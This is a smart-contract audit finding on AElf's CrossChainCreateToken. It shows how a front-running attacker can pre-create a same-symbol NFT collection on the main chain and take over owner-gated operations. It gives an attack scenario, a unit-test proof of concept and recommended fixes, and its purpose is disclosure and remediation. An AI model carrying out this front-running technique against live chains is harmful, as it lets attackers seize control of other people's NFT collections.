# Audit Report

## Title
NFT Collection Impersonation via Front-Running CrossChainCreateToken

## Summary
The `CrossChainCreateToken` function validates NFT collection existence but fails to verify that collection properties (IssueChainId, Issuer, Owner) match between source and destination chains. An attacker can front-run legitimate collection synchronization by creating a fake collection with the same symbol, causing cross-chain NFT items to reference the attacker's collection and granting unauthorized control over collection-owner-gated operations.

## Finding Description

The vulnerability exists in the `CrossChainCreateToken` method's handling of NFT collection validation. While the function calls `AssertNftCollectionExist` to verify a collection exists, it critically **discards the return value** containing the existing collection's properties and never validates them against the cross-chain data. [1](#0-0) 

The `AssertNftCollectionExist` method returns a `TokenInfo` object containing the collection's Owner, Issuer, and IssueChainId: [2](#0-1) 

However, `CrossChainCreateToken` proceeds to create a new `TokenInfo` from the source chain data without comparing it to the existing collection. When a token already exists, the function only updates alias information and returns **without overwriting** the existing token: [3](#0-2) 

This contrasts sharply with the local NFT creation flow (`CreateNFTInfo`), which properly validates collection properties by capturing the return value and enforcing that IssueChainId and Owner match: [4](#0-3) 

**Attack Enabler:** On the main chain, anyone with a seed NFT can create NFT collections locally because `State.SideChainCreator.Value == null`: [5](#0-4) 

**Attack Scenario:**
1. Attacker monitors cross-chain transactions for NFT collection "ABC-0" being synced from side chain
2. Attacker front-runs by creating fake collection "ABC-0" on main chain using a seed NFT, with attacker as Owner
3. Legitimate `CrossChainCreateToken` is called for "ABC-0", but since collection exists, it only updates alias and preserves attacker's ownership
4. All collection-owner-gated operations now validate against attacker's fake collection

**Impact Example - SetSymbolAlias:**
The `SetSymbolAlias` function checks collection ownership: [6](#0-5) 

With a fake collection, this validates against the attacker's ownership, not the legitimate NFT owner from the source chain.

## Impact Explanation

**Authorization Bypass:** The attacker gains unauthorized control over collection-owner-gated operations (like `SetSymbolAlias`) for NFTs they don't own. These operations check `collectionTokenInfo.Owner == Context.Sender`, which validates against the fake collection's owner (attacker) rather than the legitimate owner.

**Loss of Legitimate Control:** The real NFT collection owner from the source chain cannot perform collection-owner operations on their own NFTs on the destination chain, as they fail the owner check.

**Cross-Chain Integrity Violation:** NFT items reference collections with mismatched IssueChainId and Owner properties, breaking the fundamental NFT hierarchy invariant where items must belong to collections from the same issuance context.

**Affected Parties:** All NFT creators synchronizing collections and items cross-chain from side chains to main chain, particularly valuable NFT collections where alias control or other collection-owner operations have economic significance.

## Likelihood Explanation

**Attacker Requirements:**
- Ability to monitor cross-chain synchronization transactions (public mempool)
- Valid seed NFT for creating collections on main chain (obtainable through legitimate purchase)
- Ability to submit transactions before legitimate synchronization completes (standard front-running)

**Attack Complexity:** Medium
1. Monitor for `CrossChainCreateToken` calls involving NFT collections
2. Create fake collection with same symbol using seed NFT before legitimate sync
3. Fake collection persists permanently due to no-overwrite logic

**Feasibility:** High once NFT cross-chain synchronization is active. The seed NFT cost is bounded and publicly accessible. The timing window exists during any collection sync. The attack is undetectable by on-chain validation as the fake collection appears legitimate.

**Detection Difficulty:** Only off-chain comparison of collection properties across chains would reveal the discrepancy. No automated system alerts the mismatch.

## Recommendation

**Fix 1: Validate Collection Properties in CrossChainCreateToken**

When `AssertNftCollectionExist` returns a non-null collection, compare its critical properties (Owner, Issuer, IssueChainId) against the cross-chain data. If they don't match, reject the transaction:

```csharp
var existingCollection = AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
if (existingCollection != null) {
    Assert(existingCollection.Owner == (validateTokenInfoExistsInput.Owner ?? validateTokenInfoExistsInput.Issuer),
        "Collection owner mismatch between chains");
    Assert(existingCollection.Issuer == validateTokenInfoExistsInput.Issuer,
        "Collection issuer mismatch between chains");
    Assert(existingCollection.IssueChainId == validateTokenInfoExistsInput.IssueChainId,
        "Collection IssueChainId mismatch between chains");
}
```

**Fix 2: Overwrite on Property Mismatch**

Alternatively, when a token exists but properties don't match, overwrite with the cross-chain data (assuming cross-chain data is authoritative):

```csharp
if (State.TokenInfos[tokenInfo.Symbol] != null) {
    var existing = State.TokenInfos[tokenInfo.Symbol];
    if (existing.Owner != tokenInfo.Owner || 
        existing.Issuer != tokenInfo.Issuer || 
        existing.IssueChainId != tokenInfo.IssueChainId) {
        // Overwrite with authoritative cross-chain data
        RegisterTokenInfo(tokenInfo);
    }
    // Handle alias as before
}
```

## Proof of Concept

```csharp
[Fact]
public async Task NFT_Collection_Impersonation_Via_FrontRunning_Test()
{
    // Setup: Create legitimate NFT collection on side chain
    var legitimateOwner = SideChainTestKit.Accounts[1].Address;
    var attacker = Accounts[2].Address;
    var collectionSymbol = "TESTNFT-0";
    
    // Step 1: Create legitimate collection on side chain
    var createTx = await SideChainTokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = collectionSymbol,
        TokenName = "Test NFT Collection",
        TotalSupply = 1000,
        Issuer = legitimateOwner,
        Owner = legitimateOwner,
        IsBurnable = true
    });
    createTx.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify legitimate owner on side chain
    var sideChainInfo = await SideChainTokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = collectionSymbol });
    sideChainInfo.Owner.ShouldBe(legitimateOwner);
    
    // Step 2: ATTACKER front-runs by creating fake collection on main chain
    await CreateSeedNftAsync(Accounts[2]); // Attacker gets seed NFT
    var attackerStub = GetTokenContractStub(Accounts[2].KeyPair);
    var fakeTx = await attackerStub.Create.SendAsync(new CreateInput
    {
        Symbol = collectionSymbol,
        TokenName = "Fake Collection",
        TotalSupply = 1,
        Issuer = attacker,
        Owner = attacker,
        IsBurnable = false
    });
    fakeTx.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 3: Legitimate CrossChainCreateToken is called
    var tokenValidationTx = CreateTokenInfoValidationTransaction(sideChainInfo, SideChainTokenContractStub);
    var blockExecutedSet = await SideChainTestKit.MineAsync(new List<Transaction> { tokenValidationTx });
    var merklePath = GetTransactionMerklePathAndRoot(tokenValidationTx, out var blockRoot);
    await IndexMainChainTransactionAsync(blockExecutedSet.Height, blockRoot, blockRoot);
    
    var crossChainResult = await TokenContractStub.CrossChainCreateToken.SendAsync(
        new CrossChainCreateTokenInput
        {
            FromChainId = SideChainId,
            ParentChainHeight = blockExecutedSet.Height,
            TransactionBytes = tokenValidationTx.ToByteString(),
            MerklePath = merklePath
        });
    crossChainResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 4: Verify VULNERABILITY - fake collection persists on main chain
    var mainChainInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = collectionSymbol });
    
    // BUG: Main chain collection has ATTACKER as owner, not legitimate owner!
    mainChainInfo.Owner.ShouldBe(attacker); // This passes - VULNERABILITY!
    mainChainInfo.Owner.ShouldNotBe(legitimateOwner); // Legitimate owner lost control
    
    // Step 5: Demonstrate impact - attacker controls SetSymbolAlias
    var aliasResult = await attackerStub.SetSymbolAlias.SendAsync(new SetSymbolAliasInput
    {
        Symbol = "TESTNFT-1",
        Alias = "TESTNFT"
    });
    aliasResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined); // Attacker succeeds
    
    // Legitimate owner cannot set alias
    var legitimateStub = GetTokenContractStub(SideChainTestKit.Accounts[1].KeyPair);
    var legitimateTry = await legitimateStub.SetSymbolAlias.SendWithExceptionAsync(
        new SetSymbolAliasInput
        {
            Symbol = "TESTNFT-2",
            Alias = "TESTNFT2"
        });
    legitimateTry.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    legitimateTry.TransactionResult.Error.ShouldContain("No permission");
}
```

## Notes

This vulnerability specifically affects the main chain (AELF chain) when syncing NFT collections FROM side chains TO main chain, as side chains prevent local collection creation via the `State.SideChainCreator.Value` check. The attack permanently breaks the relationship between NFTs and their legitimate collections, as there is no mechanism to overwrite or correct the fake collection once it exists (the `ModifyTokenIssuerAndOwner` method only works when `Owner == null`).

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L51-66)
```csharp
        if (symbolType == SymbolType.Token || symbolType == SymbolType.NftCollection)
        {
            // can not call create on side chain
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
        }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L491-491)
```csharp
        AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L506-531)
```csharp
        if (State.TokenInfos[tokenInfo.Symbol] == null)
        {
            RegisterTokenInfo(tokenInfo);
            Context.Fire(new TokenCreated
            {
                Symbol = validateTokenInfoExistsInput.Symbol,
                TokenName = validateTokenInfoExistsInput.TokenName,
                TotalSupply = validateTokenInfoExistsInput.TotalSupply,
                Decimals = validateTokenInfoExistsInput.Decimals,
                Issuer = validateTokenInfoExistsInput.Issuer,
                IsBurnable = validateTokenInfoExistsInput.IsBurnable,
                IssueChainId = validateTokenInfoExistsInput.IssueChainId,
                ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
                Owner = tokenInfo.Owner,
            });
        }
        else
        {
            if (isSymbolAliasSet &&
                validateTokenInfoExistsInput.ExternalInfo.TryGetValue(TokenContractConstants.TokenAliasExternalInfoKey,
                    out var tokenAliasSetting))
            {
                State.TokenInfos[tokenInfo.Symbol].ExternalInfo.Value
                    .Add(TokenContractConstants.TokenAliasExternalInfoKey, tokenAliasSetting);
            }
        }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L754-761)
```csharp
        var collectionTokenInfo = GetTokenInfo(collectionSymbol);
        if (collectionTokenInfo == null)
        {
            throw new AssertionException($"NFT Collection {collectionSymbol} not found.");
        }

        Assert(collectionTokenInfo.Owner == Context.Sender || collectionTokenInfo.Issuer == Context.Sender,
            "No permission.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L15-36)
```csharp
    private Empty CreateNFTInfo(CreateInput input)
    {
        var nftCollectionInfo = AssertNftCollectionExist(input.Symbol);
        input.IssueChainId = input.IssueChainId == 0 ? nftCollectionInfo.IssueChainId : input.IssueChainId;
        Assert(
            input.IssueChainId == nftCollectionInfo.IssueChainId,
            "NFT issue ChainId must be collection's issue chainId");
        if (nftCollectionInfo.ExternalInfo != null && nftCollectionInfo.ExternalInfo.Value.TryGetValue(
                TokenContractConstants.NftCreateChainIdExternalInfoKey,
                out var nftCreateChainId) && long.TryParse(nftCreateChainId, out var nftCreateChainIdLong))
        {
            Assert(nftCreateChainIdLong == Context.ChainId,
                "NFT create ChainId must be collection's NFT create chainId");
        }
        else
        {
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
        }
        
        var owner = nftCollectionInfo.Owner ?? nftCollectionInfo.Issuer;
        Assert(Context.Sender == owner && owner == input.Owner, "NFT owner must be collection's owner");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L163-170)
```csharp
    private TokenInfo AssertNftCollectionExist(string symbol)
    {
        var collectionSymbol = GetNftCollectionSymbol(symbol);
        if (collectionSymbol == null) return null;
        var collectionInfo = GetTokenInfo(collectionSymbol);
        Assert(collectionInfo != null, "NFT collection not exist");
        return collectionInfo;
    }
```
